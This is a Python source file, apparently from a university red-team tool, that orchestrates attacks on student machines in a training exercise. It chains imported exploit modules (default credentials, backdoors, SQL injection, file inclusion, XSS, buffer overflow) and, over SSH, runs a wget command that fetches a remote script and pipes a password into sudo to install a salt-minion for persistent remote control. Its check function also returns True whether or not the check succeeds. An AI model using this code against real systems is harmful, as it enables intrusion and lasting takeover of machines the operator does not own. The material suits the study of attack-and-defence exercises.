import paramiko
import subprocess
import BetterLogger
from BetterLogger import logger
from ExploitDefaultCredentials import ExploitDefaultCredentials
from BackdoorOneNC import BackdoorOneNC
from BackdoorTwoShellPHP import BackdoorTwoShellPHP
from ChallengeOnePython import ChallengeOnePython
from ChallengeTwoUpload import ChallengeTwoUpload
from ChallengeThreeBuffer import ChallengeThreeBuffer
from ChallengeFourLFI import ChallengeFourLFI
from ChallengeFiveSQLi import ChallengeFiveSQLi
from ChallengeSixXSS import ChallengeSixXSS
from ChallengeSevenRXSS import ChallengeSevenRXSS


class TargetMachine:
    """
    TargetMachine represents a single student's machine

    Each machine has multiple exploits that can be run on it
    """

    def __init__(self, ip_address, credentials, parsed_config):
        self.ip_address = ip_address
        self.got_root = False
        self.credentials = credentials
        self.parsed_config = parsed_config

        self.exploits = []
        self.exploits.append(
            ExploitDefaultCredentials(
                ip_address=ip_address, parsed_config=parsed_config
            )
        )
        self.exploits.append(
            BackdoorOneNC(ip_address=ip_address, parsed_config=parsed_config)
        )
        self.exploits.append(
            BackdoorTwoShellPHP(ip_address=ip_address, parsed_config=parsed_config)
        )
        self.exploits.append(
            ChallengeOnePython(ip_address=ip_address, parsed_config=parsed_config)
        )
        self.exploits.append(
            ChallengeTwoUpload(ip_address=ip_address, parsed_config=parsed_config)
        )
        self.exploits.append(
            ChallengeThreeBuffer(ip_address=ip_address, parsed_config=parsed_config)
        )
        self.exploits.append(
            ChallengeFourLFI(ip_address=ip_address, parsed_config=parsed_config)
        )
        self.exploits.append(
            ChallengeFiveSQLi(ip_address=ip_address, parsed_config=parsed_config)
        )
        self.exploits.append(
            ChallengeSixXSS(ip_address=ip_address, parsed_config=parsed_config)
        )
        self.exploits.append(
            ChallengeSevenRXSS(ip_address=ip_address, parsed_config=parsed_config)
        )

    def __repr__(self) -> str:
        """
        Represent the Object as a string
        """
        return f"{type(self).__name__}({self.ip_address})"

    def ping(self):
        """
        Tests if the target machine is online

        Returns True if the target is online, False if the target is offline
        """
        logger.info(
            f"{self.ip_address} - Pinging the target machine to see if it is online..."
        )
        return_code = subprocess.call(
            f"ping -c 1 {self.ip_address}",
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            shell=True,
        )
        if return_code == 1:
            logger.info(
                f"{BetterLogger.COLOR_RED}{self.ip_address} - The target machine is offline.{BetterLogger.COLOR_END}"
            )
            return False
        else:
            logger.info(
                f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target machine is online.{BetterLogger.COLOR_END}"
            )
            return True

    def run_hellevator(self):
        """
        Attempts to run hellevator using all exploits

        Returns True if successful and False if not
        """
        logger.info(
            f"{self.ip_address} - Attempting to run hellevator using all exploits..."
        )
        executed_hellevator = False
        for exploit in self.exploits:
            try:
                ran_hellevator = exploit.run_hellevator()
                if ran_hellevator:
                    executed_hellevator = True
                    break
            except Exception:
                continue
        return executed_hellevator

    def check_for_hellevator(self):
        try:
            logger.info(
                f"{self.ip_address} - Checking if Hellevator previously ran on the target machine..."
            )

            username = self.parsed_config["ssh_username"]

            # logger.debug(f"{self.ip_address} - Logging in as `{username}` over SSH...")
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(
                self.ip_address, username=username, look_for_keys=True, timeout=3
            )  # only use SSH keys because the attacker may have changed their password
            ssh_client.close()
            # logger.debug(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - Successfully logged in as `{username}`.{BetterLogger.COLOR_END}")

            logger.info(
                f"{BetterLogger.COLOR_BLUE}{self.ip_address} - Hellevator previously ran on the target machine and you have SSH access!{BetterLogger.COLOR_END}"
            )
            return True
        except Exception:
            logger.info(
                f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - Hellevator has not been run on the target machine.{BetterLogger.COLOR_END}"
            )
            return True

    def test_all_vulnerabilities(self):
        """
        Tests if the machine is vulnerable

        Returns how many vulnerabilities the target machine has
        """
        num_vulnerabilities = 0
        for exploit in self.exploits:
            exploit_is_vulnerable = exploit.test_if_vulnerable()
            if exploit_is_vulnerable:
                num_vulnerabilities += 1
        return num_vulnerabilities

    def install_salt_minion(self):
        """
        Installs salt-minion on the target machine
        """
        try:
            logger.info(
                f"{self.ip_address} - Installing salt-minion on the target machine..."
            )

            username = self.parsed_config["ssh_username"]
            password = self.parsed_config["ssh_password"]
            salt_master_ip = self.parsed_config["salt_master_ip"]
            salt_auto_accept_grain = self.parsed_config["salt_auto_accept_grain"]

            # logger.debug(f"{self.ip_address} - Logging in as `{username}` over SSH...")
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(
                self.ip_address, username=username, look_for_keys=True, timeout=3
            )  # only use SSH keys because the attacker may have changed their password
            # logger.debug(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - Successfully logged in as `{username}`.{BetterLogger.COLOR_END}")

            # download our salt install script
            salt_download_command = "wget -O salt_install.sh https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/scripts/salt_install.sh && chmod +x salt_install.sh"
            ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(
                command=salt_download_command
            )
            return_code = ssh_stdout.channel.recv_exit_status()
            if return_code != 0:
                ssh_stdout_text = ssh_stdout.read().decode().strip()
                ssh_stderr_text = ssh_stderr.read().decode().strip()
                logger.info(
                    f"{BetterLogger.COLOR_RED}{self.ip_address} - Failed to download the salt install script!{BetterLogger.COLOR_END}"
                )
                logger.exception(
                    f"Script output:\nReturn code: {return_code}\nstd_out: `{ssh_stdout_text}`\nstd_err:`{ssh_stderr_text}`"
                )
                return False

            # run the salt install script as sudo, which requires piping our password in
            salt_install_command = f"DEBIAN_FRONTEND=noninteractive; echo '{password}' | sudo -S ./salt_install.sh -i {salt_master_ip} -g {salt_auto_accept_grain}"
            ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(
                command=salt_install_command
            )
            return_code = ssh_stdout.channel.recv_exit_status()
            if return_code != 0:
                ssh_stdout_text = ssh_stdout.read().decode().strip()
                ssh_stderr_text = ssh_stderr.read().decode().strip()
                logger.info(
                    f"{BetterLogger.COLOR_RED}{self.ip_address} - Failed to install salt-minion!{BetterLogger.COLOR_END}"
                )
                logger.exception(
                    f"Script output:\nReturn code: {return_code}\nstd_out: `{ssh_stdout_text}`\nstd_err:`{ssh_stderr_text}`"
                )
                return False

            logger.info(
                f"{BetterLogger.COLOR_BLUE}{self.ip_address} - The salt-minion was successfully installed!{BetterLogger.COLOR_END}"
            )
            return True
        except Exception as err:
            logger.info(
                f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - Something went wrong while installing the salt-minion!{BetterLogger.COLOR_END}"
            )
            logger.exception(err)
            return True
